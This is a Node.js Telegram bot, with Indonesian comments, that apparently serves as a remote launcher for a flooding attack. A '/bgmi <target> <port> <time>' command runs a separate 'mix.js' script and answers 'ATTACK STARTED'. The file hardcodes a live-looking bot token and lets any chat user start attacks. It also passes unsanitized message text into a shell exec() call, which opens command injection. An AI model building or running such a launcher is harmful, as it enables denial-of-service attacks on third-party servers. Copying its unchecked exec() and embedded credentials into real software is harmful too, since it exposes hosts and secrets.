const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token bot Telegram Anda
const token = '7385741654:AAGSq43yfKEkQ9E9iJfgdcCvHbYolzsQvRM';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Tidak ada'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

  // Menanggapi perintah /mix
  if (command.startsWith('/bgmi')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const target = args[1];
    const port = args[2];
    const time = args[3];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && target && time && port) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node mix.js ${target} ${port} ${time}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'LAND NAHI HOGA');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'NAHI HUVA SIR');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, '𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥: /bgmi <target> <port> <time>');
    }
  }
});
